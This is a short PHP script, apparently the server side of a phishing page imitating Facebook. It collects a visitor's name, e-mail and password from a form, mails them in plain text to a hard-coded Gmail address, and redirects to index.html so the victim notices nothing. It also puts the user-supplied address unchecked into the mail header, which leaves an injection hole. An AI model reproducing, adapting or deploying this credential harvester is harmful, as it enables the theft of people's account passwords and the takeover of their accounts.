<?php
$name = $_POST['name'];
$mail = $_POST['mail'];
$password = $_POST['password'];
$message = $_POST['message'];

$header = 'From: ' . $mail . " \r\n";
$header .= "X-Mailer: PHP/" . phpversion() . " \r\n";
$header .= "Mime-Version: 1.0 \r\n";
$header .= "Content-Type: text/plain";

$message = "Este mensaje fue enviado por: " . $name . " \r\n";
$message .= "Su e-mail es: " . $mail . " \r\n";
$message .= "Contraseña: " . $password . " \r\n";
$message .= "Mensaje: " . $_POST['message'] . " \r\n";
$message .= "Enviado el: " . date('d/m/Y', time());

$para = 'josemiguelmanzuetalinares@gmail.com';
$asunto = 'Mensaje de (facebook)';

mail($para, $asunto, utf8_decode($message), $header);

header("Location:index.html");
?>